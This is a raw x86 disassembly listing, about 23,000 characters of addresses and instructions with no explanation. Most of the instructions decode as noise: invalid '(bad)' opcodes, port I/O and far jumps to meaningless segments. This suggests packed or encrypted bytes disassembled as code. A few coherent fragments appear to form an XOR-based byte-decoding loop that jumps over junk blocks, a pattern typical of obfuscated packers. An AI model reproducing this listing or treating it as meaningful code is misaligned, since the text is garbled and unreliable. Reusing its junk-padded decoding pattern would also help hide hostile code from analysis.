  412afa:	mov    ebx,DWORD PTR [ebx-0x23]
  412afd:	gs ret 0xf3d5
  412b01:	add    al,0xce
  412b03:	cmp    eax,0xdb582f09
  412b08:	adc    eax,0x4aac992c
  412b0d:	add    ebp,edx
  412b0f:	mov    bl,0x3
  412b11:	xchg   BYTE PTR [ecx+0x36],bl
  412b14:	xchg   esi,eax
  412b15:	and    dl,cl
  412b17:	jp     0x412b00
  412b19:	(bad)  
  412b1b:	leave  
  412b1c:	shl    BYTE PTR es:[edx],0xa2
  412b20:	fisubr DWORD PTR [ebx+eiz*8-0x59b6d0fa]
  412b27:	mov    esi,DWORD PTR fs:[edx+0x307a61a1]
  412b2e:	cld    
  412b2f:	mov    eax,0xf9eec57
  412b34:	das    
  412b35:	adc    ah,BYTE PTR [ebx]
  412b37:	scas   al,BYTE PTR es:[edi]
  412b38:	pop    ss
  412b39:	(bad)  
  412b3a:	sbb    eax,0x8392ec7e
  412b3f:	sbb    DWORD PTR [ebp-0x1f9a8340],edi
  412b45:	cmp    BYTE PTR [eax+0x401b4378],ch
  412b4b:	cmp    eax,0xb2e2352b
  412b50:	mov    eax,0x121ee477
  412b55:	mov    al,0x8
  412b57:	das    
  412b58:	push   0xffffffb6
  412b5a:	mov    dl,0x16
  412b5c:	push   es
  412b5d:	jmp    0x2d58:0xc484ace6
  412b64:	in     eax,0x71
  412b66:	sub    al,0x1f
  412b68:	fdivr  QWORD PTR [ebx+0x5a]
  412b6b:	out    0xb4,eax
  412b6d:	dec    edi
  412b6e:	loopne 0x412b80
  412b70:	out    dx,al
  412b71:	aas    
  412b72:	push   edi
  412b73:	xor    WORD PTR [eax-0x1d],0xffab
  412b78:	out    0xe8,al
  412b7a:	lahf   
  412b7b:	arpl   WORD PTR [eax],sp
  412b7d:	adc    DWORD PTR [ecx+0x3f580936],0x10
  412b84:	retf   
  412b85:	nop
  412b86:	cli    
  412b87:	xchg   BYTE PTR [esi+ebp*2-0x1ce46795],ch
  412b8e:	jmp    0x9a09:0x17db295c
  412b95:	mov    eax,0xe52cbf80
  412b9a:	(bad)  
  412b9b:	popa   
  412b9c:	stos   DWORD PTR es:[edi],eax
  412b9d:	retf   0x3a4d
  412ba0:	lock mov eax,ds:0xb8d875be
  412ba6:	out    0x16,al
  412ba8:	arpl   WORD PTR [ecx],di
  412baa:	lock cld 
  412bac:	mov    ds:0x35c30b39,eax
  412bb1:	mov    ds,WORD PTR [edi+0x333cf046]
  412bb7:	push   ecx
  412bb8:	adc    dh,bh
  412bba:	xor    BYTE PTR [edi-0x34],ah
  412bbd:	mov    ds:0x46bc052c,eax
  412bc2:	mov    WORD PTR [eax+0x40d8645f],cs
  412bc8:	mov    bh,0x86
  412bca:	inc    esi
  412bcb:	xchg   DWORD PTR [ebx+0x63],ebx
  412bce:	fdiv   QWORD PTR [edx]
  412bd0:	mov    al,ds:0xec8e3142
  412bd5:	hlt    
  412bd6:	and    DWORD PTR [ecx+ecx*8+0xfa70c25],eax
  412bdd:	call   0x2482:0x3dc92a6e
  412be4:	inc    edx
  412be5:	cmp    BYTE PTR [edi-0x7d6bfe7d],0x2a
  412bec:	push   es
  412bed:	mov    bh,0x23
  412bef:	xchg   ebp,eax
  412bf0:	aam    0x3e
  412bf2:	(bad)  
  412bf3:	jmp    0x3810:0x5e6ed26
  412bfa:	fucomip st,st(3)
  412bfc:	ins    BYTE PTR es:[edi],dx
  412bfd:	fld    DWORD PTR [edx+0x624726da]
  412c03:	and    al,0xb8
  412c05:	jno    0x412c43
  412c07:	stos   BYTE PTR es:[edi],al
  412c08:	mov    BYTE PTR [ecx],bh
  412c0a:	adc    BYTE PTR [edx],bl
  412c0c:	into   
  412c0d:	imul   eax,DWORD PTR [ebp+0x39],0x45
  412c11:	push   edx
  412c12:	sbb    ch,BYTE PTR [edx]
  412c14:	call   0xc68e7489
  412c19:	(bad)  
  412c1a:	xchg   esi,eax
  412c1b:	cld    
  412c1c:	int    0xce
  412c1e:	lods   eax,DWORD PTR ds:[esi]
  412c1f:	addr16 ss (bad) 
  412c22:	jmp    DWORD PTR [edx]
  412c24:	cli    
  412c25:	out    0x6c,eax
  412c27:	lahf   
  412c28:	xor    DWORD PTR [esi-0x17],0xc2abdbaa
  412c2f:	outs   dx,BYTE PTR ds:[esi]
  412c30:	jae    0x412c6b
  412c32:	in     eax,0x5f
  412c34:	retf   0xa900
  412c37:	(bad)  
  412c39:	push   esi
  412c3a:	xor    bl,bl
  412c3c:	sahf   
  412c3d:	jne    0x412c23
  412c3f:	add    esi,esp
  412c41:	mov    WORD PTR [edi-0x27],?
  412c44:	jo     0x412c08
  412c46:	jp     0x412cc3
  412c48:	imul   eax,eax,0x5a
  412c4b:	loopne 0x412c05
  412c4d:	cs int 0x7
  412c50:	leave  
  412c51:	pusha  
  412c52:	xchg   ebp,eax
  412c53:	int3   
  412c54:	shl    DWORD PTR [ebx+0x1c20da49],0xae
  412c5b:	frstor [edx]
  412c5d:	dec    ebp
  412c5e:	pop    ss
  412c5f:	pop    es
  412c60:	sbb    eax,0x18028363
  412c65:	adc    al,0xc5
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   esi,esi
  412c83:	jns    0x412c6c
  412c85:	int    0xfc
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412cb4
  412c8f:	or     DWORD PTR [edx],eax
  412c91:	aad    0x6a
  412c93:	jne    0x412cfc
  412c95:	xchg   BYTE PTR [ebx],ch
  412c97:	ss test eax,0xc05ad1fc
  412c9d:	sbb    DWORD PTR [esi+0x3a],ebp
  412ca0:	lahf   
  412ca1:	mov    bl,0x54
  412ca3:	enter  0x8df5,0xf4
  412ca7:	mov    ebp,0xfb168363
  412cac:	cmc    
  412cad:	repnz push ss
  412caf:	call   0x9c288134
  412cb4:	mov    ch,0x53
  412cb6:	sbb    eax,0xcb45eb5d
  412cbb:	bswap  esp
  412cbd:	pop    ebx
  412cbe:	in     eax,dx
  412cbf:	test   DWORD PTR [edi+edi*2+0x6b],edi
  412cc3:	in     al,0x52
  412cc5:	in     al,dx
  412cc6:	inc    esp
  412cc7:	pop    esp
  412cc8:	mov    BYTE PTR [eax-0x73],ch
  412ccb:	mov    eax,edx
  412ccd:	xchg   ecx,eax
  412cce:	loope  0x412d38
  412cd0:	adc    eax,0x3f41dc94
  412cd5:	mov    edi,0x92495a23
  412cda:	jne    0x412d3b
  412cdc:	neg    ch
  412cde:	ja     0x412ce9
  412ce0:	call   DWORD PTR [ebx]
  412ce2:	repnz pop ebp
  412ce4:	push   eax
  412ce5:	int3   
  412ce6:	fsub   st,st(4)
  412ce8:	in     eax,0x65
  412cea:	mov    ecx,0x24352c48
  412cef:	mov    dh,0x7f
  412cf1:	(bad)  
  412cf3:	jbe    0x412d67
  412cf5:	cmp    eax,0x79b5df44
  412cfa:	leave  
  412cfb:	cmp    DWORD PTR [esi-0x3f14510a],ebp
  412d01:	hlt    
  412d02:	mov    esp,0x199e3789
  412d07:	pop    ss
  412d08:	jno    0x412d29
  412d0a:	add    dh,BYTE PTR [ecx]
  412d0c:	dec    esi
  412d0d:	mov    BYTE PTR ds:[ecx],bl
  412d10:	jo     0x412d69
  412d12:	push   ss
  412d13:	(bad)  
  412d14:	sub    ebx,esp
  412d16:	dec    ebp
  412d17:	nop
  412d18:	push   ecx
  412d19:	aam    0x5a
  412d1b:	dec    ecx
  412d1c:	push   0x76b8818
  412d21:	sbb    BYTE PTR fs:[esi+0x49],dh
  412d25:	jns    0x412cdc
  412d27:	mov    WORD PTR [ecx-0x2f293da9],?
  412d2d:	or     edi,DWORD PTR [ebx]
  412d2f:	loop   0x412d78
  412d31:	push   edx
  412d32:	xlat   BYTE PTR ds:[ebx]
  412d33:	add    eax,0xbbf23bb2
  412d38:	sub    al,0x43
  412d3a:	sub    edi,esi
  412d3c:	pushf  
  412d3d:	cmc    
  412d3e:	test   al,0x14
  412d40:	fld    st(2)
  412d42:	xchg   edi,eax
  412d43:	imul   DWORD PTR [esp+eax*2]
  412d46:	mov    ebx,0x46b88e62
  412d4b:	sbb    bl,BYTE PTR [ecx+0x14945999]
  412d51:	add    ebx,DWORD PTR [eax]
  412d53:	xor    eax,0x4d8ea53a
  412d58:	pop    esp
  412d5a:	cld    
  412d5b:	dec    ebx
  412d5c:	stos   BYTE PTR es:[edi],al
  412d5d:	xchg   BYTE PTR [bx+si+0x30],ah
  412d61:	mov    dl,0xd3
  412d63:	mov    BYTE PTR [eax-0x26],ah
  412d66:	or     al,0xa1
  412d68:	xchg   ebp,eax
  412d69:	clc    
  412d6a:	mov    bh,0x19
  412d6c:	cmc    
  412d6d:	xchg   ebp,eax
  412d6e:	loop   0x412d04
  412d70:	out    0xce,al
  412d72:	bound  esi,QWORD PTR [edx]
  412d74:	mov    edx,0xe0e516ef
  412d79:	ss popa 
  412d7b:	fwait
  412d7c:	xchg   edx,eax
  412d7d:	push   ss
  412d7e:	jno    0x412d6d
  412d80:	push   ecx
  412d81:	popf   
  412d82:	popf   
  412d83:	cmp    edx,DWORD PTR [esi-0x60]
  412d86:	sbb    DWORD PTR [ebx-0x50],edx
  412d89:	call   0xa1600963
  412d8e:	inc    ebp
  412d8f:	pop    si
  412d91:	ja     0x412df9
  412d93:	pop    ebp
  412d94:	jl     0x412d88
  412d96:	aam    0x45
  412d98:	pushf  
  412d99:	aam    0xc8
  412d9b:	adc    eax,0x14ba2f22
  412da0:	cmp    eax,0x6fb9ed82
  412da5:	cmp    eax,0x44ec5e19
  412daa:	sub    ebp,DWORD PTR [edi-0x59619c]
  412db0:	mov    ch,0x72
  412db2:	sbb    DWORD PTR [ecx],ebx
  412db4:	repz shl BYTE PTR [edx+0x21],1
  412db8:	std    
  412db9:	inc    edi
  412dba:	xchg   BYTE PTR [esi-0x36],bl
  412dbd:	sub    al,0x1a
  412dbf:	and    DWORD PTR [eax+0x1c],edx
  412dc2:	mov    bh,0x77
  412dc4:	loope  0x412d5a
  412dc6:	mov    ebx,0x3d30c8a2
  412dcb:	int    0xff
  412dcd:	add    ch,BYTE PTR [edx]
  412dcf:	push   ds
  412dd0:	inc    edi
  412dd1:	dec    esi
  412dd2:	(bad)  
  412dd3:	sbb    ch,BYTE PTR [ebp-0x2de047d8]
  412dd9:	(bad)  
  412dda:	cld    
  412ddb:	inc    eax
  412ddc:	and    BYTE PTR [ebx],ah
  412dde:	xchg   ebp,eax
  412ddf:	imul   eax,DWORD PTR [esi-0x56ff220c],0xddee3ad7
  412de9:	test   BYTE PTR [edi+0x2c],dl
  412dec:	test   DWORD PTR [ecx],edx
  412dee:	mov    ch,0x6e
  412df0:	add    ebp,esp
  412df2:	loopne 0x412e12
  412df4:	cs out 0x4f,al
  412df7:	(bad)  [eax-0x13a08c8d]
  412dfd:	retf   
  412dfe:	int    0x26
  412e00:	sbb    edi,ecx
  412e02:	out    dx,eax
  412e03:	ins    DWORD PTR es:[edi],dx
  412e04:	bound  eax,QWORD PTR [ecx]
  412e06:	mov    ch,dh
  412e08:	and    eax,0x4c5a37ca
  412e0d:	(bad)  
  412e0e:	loopne 0x412d90
  412e10:	xor    al,BYTE PTR [ebx+edi*1]
  412e13:	xor    eax,ecx
  412e15:	dec    ebx
  412e16:	push   eax
  412e17:	add    eax,0x828b70ec
  412e1c:	xchg   ebp,eax
  412e1d:	push   es
  412e1e:	aad    0x8e
  412e20:	gs adc eax,0xac0bdf00
  412e26:	sahf   
  412e27:	cli    
  412e28:	adc    dh,BYTE PTR [edx+0x7815144f]
  412e2e:	pop    DWORD PTR [ebp+0x33]
  412e31:	dec    esp
  412e32:	adc    al,BYTE PTR [ecx+ecx*2+0x2b]
  412e36:	add    al,0x67
  412e38:	mov    ebp,0x9872e41
  412e3d:	ins    DWORD PTR es:[edi],dx
  412e3e:	cwde   
  412e3f:	push   es
  412e40:	mov    dl,0x2a
  412e42:	pop    edi
  412e43:	hlt    
  412e44:	add    cl,BYTE PTR [edi]
  412e46:	mov    eax,ds:0x78030832
  412e4b:	xchg   ecx,eax
  412e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e4d:	mov    bl,0x7a
  412e4f:	mov    DWORD PTR ds:0x871207d8,edx
  412e55:	ins    BYTE PTR es:[edi],dx
  412e56:	test   edx,0x169b36d1
  412e5c:	shl    eax,cl
  412e5e:	mov    ebx,0xc2c07f51
  412e63:	adc    BYTE PTR [edx-0x7a234b75],ah
  412e69:	inc    edx
  412e6a:	or     al,0x34
  412e6c:	ins    DWORD PTR es:[edi],dx
  412e6d:	fimul  WORD PTR [esi+0x4370e274]
  412e73:	mov    al,0xb8
  412e75:	xchg   DWORD PTR [edx],ebp
  412e77:	xor    DWORD PTR [edx],esi
  412e79:	or     al,0xd0
  412e7b:	pop    esi
  412e7c:	retf   
  412e7d:	cmp    esi,DWORD PTR [edi]
  412e7f:	fild   DWORD PTR [ecx-0x53]
  412e82:	adc    ebp,ebx
  412e84:	push   edx
  412e85:	mov    dl,0x2f
  412e87:	mov    WORD PTR [eiz*1+0x3915dd1c],?
  412e8e:	aad    0xfc
  412e90:	lods   al,BYTE PTR ds:[esi]
  412e91:	inc    ebx
  412e92:	push   ss
  412e93:	arpl   WORD PTR [ebp+0x7f14e372],bx
  412e99:	pusha  
  412e9a:	mov    bl,0xde
  412e9c:	stos   DWORD PTR es:[edi],eax
  412e9d:	fistp  QWORD PTR [esi]
  412e9f:	pop    es
  412ea0:	cmp    bl,BYTE PTR [esi-0x5adf3012]
  412ea6:	push   edx
  412ea7:	xchg   edi,eax
  412ea8:	dec    eax
  412ea9:	inc    esi
  412eaa:	jge    0x412e3e
  412eac:	inc    edi
  412ead:	iret   
  412eae:	ja     0x412ea7
  412eb0:	jo     0x412e33
  412eb2:	pop    ebx
  412eb3:	xchg   ebp,eax
  412eb4:	loope  0x412e9c
  412eb6:	xchg   edi,eax
  412eb7:	mov    ah,0x61
  412eb9:	repnz pop ss
  412ebb:	lock (bad) 
  412ebd:	mov    ebp,0xd3bb4d7
  412ec2:	or     eax,0xf6bd998b
  412ec7:	inc    ebx
  412ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec9:	inc    esi
  412eca:	adc    al,0x31
  412ecc:	push   ebx
  412ecd:	add    eax,DWORD PTR [eax+esi*1]
  412ed0:	push   cs
  412ed1:	popa   
  412ed2:	xor    ah,al
  412ed4:	xor    eax,0xb42e90a
  412ed9:	jb     0x412f5a
  412edb:	push   esp
  412edc:	sar    DWORD PTR [esi-0x78],cl
  412edf:	mov    BYTE PTR [ecx-0x4e],ch
  412ee2:	cwde   
  412ee3:	mov    al,ds:0x4148ce96
  412ee8:	adc    eax,0x3adbcf1c
  412eed:	dec    ebx
  412eee:	retf   0x9bf9
  412ef1:	ja     0x412ed9
  412ef3:	(bad)  
  412ef4:	out    0x2,al
  412ef6:	mov    dl,0x5f
  412ef8:	or     BYTE PTR [eax+0x558b0f55],0xf4
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x6
  412f26:	sub    al,BYTE PTR [esi]
  412f28:	adc    eax,0x78787569
  412f2d:	in     eax,0x7e
  412f2f:	js     0x412fa9
  412f31:	xchg   edx,eax
  412f32:	and    esp,edx
  412f34:	das    
  412f35:	push   eax
  412f36:	xor    DWORD PTR [esi],eax
  412f38:	(bad)  [edx]
  412f3a:	or     ah,ah
  412f3c:	lahf   
  412f3d:	ds mov bl,0x90
  412f40:	dec    esi
  412f41:	sub    dl,BYTE PTR ds:0x48b26ee
  412f47:	ds in  al,0x24
  412f4a:	scas   al,BYTE PTR es:[edi]
  412f4b:	scas   al,BYTE PTR es:[edi]
  412f4c:	xchg   edx,eax
  412f4d:	inc    edi
  412f4e:	mov    ecx,0x25687139
  412f53:	aaa    
  412f54:	cmc    
  412f55:	push   cs
  412f56:	test   eax,0x69e66c13
  412f5b:	cmp    eax,0xe3e6bdbe
  412f60:	xor    edi,DWORD PTR [edi+0x7]
  412f63:	cmp    al,0xe6
  412f65:	lods   eax,DWORD PTR ds:[esi]
  412f66:	arpl   WORD PTR [edx+0x6d9ae80b],bx
  412f6c:	das    
  412f6d:	xsavec [edx]
  412f70:	add    al,0x65
  412f72:	mov    cl,BYTE PTR [edx]
  412f74:	scas   al,BYTE PTR es:[edi]
  412f75:	repz sub eax,0xae2e3f03
  412f7b:	and    al,0x77
  412f7d:	sbb    BYTE PTR [ebx-0x53b4c8e6],ch
  412f83:	cld    
  412f84:	rcr    DWORD PTR [ecx],1
  412f86:	popa   
  412f87:	push   esp
  412f88:	add    DWORD PTR ds:0x92c0719,ebx
  412f8e:	int3   
  412f8f:	data16 fidiv DWORD PTR [edi+edx*4+0x6a]
  412f94:	xor    DWORD PTR [eax-0x1f],eax
  412f97:	mov    dl,0xad
  412f99:	xchg   ebp,eax
  412f9a:	lods   al,BYTE PTR ds:[esi]
  412f9b:	ret    0xebf9
  412f9e:	pop    esi
  412f9f:	fnstsw WORD PTR [esi]
  412fa1:	adc    al,0x6
  412fa3:	and    ecx,DWORD PTR [esi+0x240b0c91]
  412fa9:	xor    BYTE PTR ds:0x21447f5a,ah
  412faf:	inc    ebx
  412fb0:	aam    0x63
  412fb2:	js     0x412fd7
  412fb4:	mov    edi,0x769e49ad
  412fb9:	lds    edi,FWORD PTR [ebp+0x4e6a83df]
  412fbf:	cmc    
  412fc0:	scas   eax,DWORD PTR es:[edi]
  412fc1:	ins    DWORD PTR es:[edi],dx
  412fc2:	xchg   BYTE PTR [ebx+0x6a],dh
  412fc5:	fdivr  DWORD PTR [ebp+0x61]
  412fc8:	stos   DWORD PTR es:[edi],eax
  412fc9:	add    ebx,DWORD PTR [eax+0x1cf17963]
  412fcf:	and    esi,DWORD PTR [edi]
  412fd1:	sbb    BYTE PTR [edx+0x23b31d75],ah
  412fd7:	mov    ch,0x92
  412fd9:	mov    bl,BYTE PTR [edi+eax*4-0x8]
  412fdd:	retf   
  412fde:	push   ss
  412fdf:	pop    esp
  412fe0:	imul   esi,DWORD PTR [edi+0x1a],0x9d2c5af8
  412fe7:	dec    ebx
  412fe8:	inc    ebp
  412fe9:	enter  0xa523,0xac
  412fed:	iret   
  412fee:	scas   eax,DWORD PTR es:[edi]
  412fef:	inc    BYTE PTR [eax]
  412ff1:	pop    ss
  412ff2:	aas    
  412ff3:	push   edx
  412ff4:	jo     0x412f95
  412ff6:	mov    ebp,0x1cf1239b
  412ffb:	scas   al,BYTE PTR es:[edi]
  412ffc:	test   BYTE PTR [edi],dl
  412ffe:	or     ch,BYTE PTR [edx-0x6]
  413001:	cmp    eax,DWORD PTR [ebx+0x2fc977ed]
  413007:	ins    BYTE PTR es:[edi],dx
  413008:	push   ebp
  413009:	mov    ds:0x6646d080,al
  41300e:	fdivr  DWORD PTR ds:0x3817649f
  413014:	ror    BYTE PTR [esi+ebp*4],cl
  413017:	rcr    BYTE PTR [esp+eiz*8-0x286c054c],cl
  41301e:	arpl   bp,di
  413020:	int    0x28
  413022:	cli    
  413023:	cld    
  413024:	cmp    esi,ebp
  413026:	lods   al,BYTE PTR ds:[esi]
  413027:	jmp    0x5a14:0xbb49d823
  41302e:	fld    QWORD PTR [edi]
  413030:	inc    edx
  413031:	gs inc edi
  413033:	mov    ecx,0x76bf849a
  413038:	outs   dx,BYTE PTR ds:[esi]
  413039:	xchg   ebp,eax
  41303a:	addr16 loopne 0x41305f
  41303d:	pop    esi
  41303e:	jb     0x412fd9
  413040:	jecxz  0x413083
  413042:	ss xor dh,cl
  413045:	popf   
  413046:	popf   
  413047:	xor    eax,0x5c41cb7b
  41304c:	pusha  
  41304d:	fwait
  41304e:	repz ret 
  413050:	xchg   esi,eax
  413051:	cmpxchg DWORD PTR [ecx],esp
  413054:	loop   0x413017
  413056:	fcomp  DWORD PTR [edi+0x53]
  413059:	lods   al,BYTE PTR ds:[esi]
  41305a:	push   edx
  41305b:	mov    ds:0x4f19d98c,al
  413060:	xchg   ebp,eax
  413061:	sbb    DWORD PTR [ebx],eax
  413063:	and    DWORD PTR [eax],edi
  413065:	xchg   esi,ebx
  413067:	pop    eax
  413068:	cmp    esp,DWORD PTR gs:[ebx+0x10]
  41306c:	pop    ss
  41306d:	mov    al,0x8a
  41306f:	or     eax,0xe933c191
  413074:	or     dl,bl
  413076:	mov    bh,0x3a
  413078:	je     0x413009
  41307a:	add    BYTE PTR [ebp-0x9],ch
  41307d:	mov    ds:0x5c6d6bc8,eax
  413082:	nop
  413083:	in     eax,0x73
  413085:	loopne 0x413089
  413087:	push   ss
  413088:	inc    esp
  413089:	lock cdq 
  41308b:	loop   0x413048
  41308d:	cld    
  41308e:	cld    
  41308f:	push   ds
  413090:	into   
  413091:	inc    ebp
  413092:	pop    es
  413093:	or     DWORD PTR [esi],ebx
  413095:	pop    eax
  413096:	lock mov dl,0x39
  413099:	mov    edi,0x7f483768
  41309e:	sti    
  41309f:	mov    ah,0xac
  4130a1:	daa    
  4130a2:	fsub   QWORD PTR [edx-0x9d8d565]
  4130a8:	xor    eax,0xc92bbc59
  4130ad:	in     eax,0x63
  4130af:	shl    DWORD PTR [ebp+0x2086e136],cl
  4130b5:	imul   ebx,DWORD PTR [eax+0x383e848],0x5346241
  4130bf:	in     al,0xbc
  4130c1:	push   ebp
  4130c2:	scas   eax,DWORD PTR es:[edi]
  4130c3:	mov    esi,0xc490290f
  4130c8:	mov    cl,0xce
  4130ca:	fadd   QWORD PTR [esi-0x69]
  4130cd:	dec    edx
  4130ce:	inc    eax
  4130cf:	adc    ecx,DWORD PTR [ebp+0x24]
  4130d2:	fs inc esp
  4130d4:	lea    esi,[edi]
  4130d6:	fild   DWORD PTR [ecx-0x4a]
  4130d9:	test   esi,0x45e93e29
  4130df:	xor    eax,0x8da340d8
  4130e4:	inc    edi
  4130e5:	and    DWORD PTR [ecx],ecx
  4130e7:	sub    BYTE PTR [ebx-0x62],dl
  4130ea:	push   ebx
  4130eb:	ror    BYTE PTR [ebx+ecx*4+0x1e],0x41
  4130f0:	cld    
  4130f1:	dec    ecx
  4130f2:	test   DWORD PTR ds:0xe0f14162,ecx
  4130f8:	and    ch,bl
  4130fa:	jnp    0x4130bb
  4130fc:	xchg   bl,bh
  4130fe:	ror    DWORD PTR ds:0x150f7dee,cl
  413104:	repz fisttp QWORD PTR [ecx+0x61]
  413108:	fidiv  DWORD PTR [ecx-0x5d173c17]
  41310e:	dec    esp
  41310f:	and    BYTE PTR [esp+edx*4-0x39f117b7],cl
  413116:	push   cs
  413117:	and    ebx,DWORD PTR [ebx+0x6c]
  41311a:	sub    eax,0x275951ce
  41311f:	jns    0x413121
  413121:	test   BYTE PTR [esi+0x7f],0x91
  413125:	arpl   WORD PTR [esi-0x485deaf1],di
  41312b:	adc    al,0x81
  41312d:	bound  ebp,QWORD PTR [eax]
  41312f:	mov    bh,BYTE PTR [edi]
  413131:	iret   
  413132:	dec    esi
  413133:	addr16 cmc 
  413135:	pop    ds
  413136:	sbb    ebx,DWORD PTR [edx-0x50]
  413139:	fsub   DWORD PTR [ebx]
  41313b:	fld    st(6)
  41313d:	dec    esi
  41313e:	(bad)  
  41313f:	aaa    
  413140:	daa    
  413141:	add    dl,bl
  413143:	mov    dl,0x18
  413145:	cli    
  413146:	(bad)  
  413148:	cwde   
  413149:	sbb    al,0x7e
  41314b:	test   edx,edi
  41314d:	xchg   BYTE PTR [eax-0x6e32f71b],bh
  413153:	add    eax,0x5f0726af
  413158:	mov    ebx,0xd76f363
  41315d:	in     al,0xb3
  41315f:	ja     0x41317e
  413161:	ret    
  413162:	daa    
  413163:	aas    
  413164:	retf   0x8f78
  413167:	jnp    0x41310e
  413169:	out    dx,al
  41316a:	in     al,dx
  41316b:	mov    dh,0x6a
  41316d:	adc    eax,0x5fc83836
  413172:	add    edi,DWORD PTR [ecx]
  413174:	mov    esi,DWORD PTR [eax-0x9]
  413177:	enter  0xa94c,0x6e
  41317b:	mov    esi,0xe9d227c6
  413180:	ins    BYTE PTR es:[edi],dx
  413181:	retf   
  413182:	jg     0x4131e5
  413184:	fdivr  DWORD PTR [edx+0x5d620b7a]
  41318a:	xor    al,0xda
  41318c:	inc    edx
  41318d:	adc    DWORD PTR [ebp-0x40],eax
  413190:	shr    BYTE PTR [esi],cl
  413192:	call   0x12abd621
  413197:	add    bh,0x93
  41319a:	js     0x4131db
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	in     al,0x87
  4131c9:	nop
  4131ca:	hlt    
  4131cb:	(bad)  
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x4131c0
  4131d4:	out    dx,eax
  4131d5:	mov    al,bh
  4131d7:	adc    ebp,edx
  4131d9:	fst    DWORD PTR [esi-0x48a2ada5]
  4131df:	jnp    0x41318d
  4131e1:	cmp    cl,BYTE PTR [ebp+0x64]
  4131e4:	xlat   BYTE PTR ds:[ebx]
  4131e5:	mov    eax,ds:0x2eb220c2
  4131ea:	scas   al,BYTE PTR es:[edi]
  4131eb:	mov    eax,ds:0x2c0098ff
  4131f0:	out    dx,al
  4131f1:	inc    ebp
  4131f2:	outs   dx,BYTE PTR ds:[esi]
  4131f3:	sub    ebp,DWORD PTR [eax-0x2602df34]
  4131f9:	test   DWORD PTR [ecx+0x3f],0x123cd06d
  413200:	xchg   esp,eax
  413201:	mov    ecx,0xa6d63058
  413206:	mov    ecx,0xc7cde9fe
  41320b:	jae    0x413262
  41320d:	push   cs
  41320e:	add    bh,BYTE PTR [eax]
  413210:	(bad)  
  413212:	mov    ds:0x5c3b9b4e,eax
  413217:	stc    
  413218:	aad    0x23
  41321a:	or     cl,BYTE PTR [eax-0x60]
  41321d:	xor    ebx,DWORD PTR [eax]
  41321f:	mov    WORD PTR [ebx-0x23b0af62],fs
  413225:	inc    ebx
  413226:	add    al,0xc5
  413228:	mov    bl,0xe7
  41322a:	es std 
  41322c:	fimul  WORD PTR [esi-0x4ee014be]
  413232:	test   al,0xde
  413234:	(bad)  
  413235:	xchg   ebx,eax
  413236:	or     esi,DWORD PTR [edx+0x37e6768b]
  41323c:	mov    ecx,0xbc19c475
  413241:	fild   QWORD PTR [ebp+0x6b9e6332]
  413247:	bound  ebp,QWORD PTR [ebx-0x5e]
  41324a:	and    eax,DWORD PTR [edi-0x57]
  41324d:	in     eax,0x0
  41324f:	imul   esi,DWORD PTR [edi+0x35],0x64
  413253:	push   ecx
  413254:	ss in  eax,dx
  413256:	push   esp
  413257:	dec    esi
  413258:	aaa    
  413259:	fs or  eax,0xe4c89242
  41325f:	xchg   esi,eax
  413260:	jge    0x413216
  413262:	int3   
  413263:	mov    eax,ds:0xef3fd76f
  413268:	iret   
  413269:	jecxz  0x4132c5
  41326b:	inc    ebp
  41326c:	jecxz  0x413210
  41326e:	mov    bl,0x70
  413270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413271:	or     BYTE PTR [eax-0x17c52048],al
  413277:	fldcw  WORD PTR [eax+esi*1]
  41327a:	hlt    
  41327b:	add    eax,0xa8db6f4f
  413280:	in     al,dx
  413281:	push   ebp
  413282:	push   ecx
  413283:	mov    dl,0x8a
  413285:	test   DWORD PTR [edx+esi*4-0x36],esp
  413289:	nop
  41328a:	je     0x413248
  41328c:	xor    BYTE PTR [ecx-0x2d],0x26
  413290:	mov    al,ds:0x13f9576
  413295:	stos   BYTE PTR es:[edi],al
  413296:	bswap  ebx
  413298:	enter  0xb4f8,0x7f
  41329c:	arpl   WORD PTR [edx],cx
  41329e:	shl    BYTE PTR [eax],1
  4132a0:	ds into 
  4132a2:	ficom  DWORD PTR [ebp+0x41]
  4132a5:	add    eax,0xd7c3774c
  4132aa:	cmp    BYTE PTR [ecx-0x41],0x40
  4132ae:	xchg   ebx,eax
  4132af:	cmp    bh,BYTE PTR [esi-0x735f6ae3]
  4132b5:	jns    0x4132c2
  4132b7:	pop    ebx
  4132b8:	fst    st(5)
  4132ba:	inc    edi
  4132bb:	push   esi
  4132bc:	nop
  4132bd:	jp     0x41327c
  4132bf:	xchg   ebx,eax
  4132c0:	xchg   ebx,eax
  4132c1:	mov    ah,0x57
  4132c3:	jne    0x41333b
  4132c5:	dec    ecx
  4132c6:	scas   eax,DWORD PTR es:[edi]
  4132c7:	fwait
  4132c8:	cli    
  4132c9:	loopne 0x4132e5
  4132cb:	jl     0x413253
  4132cd:	push   ss
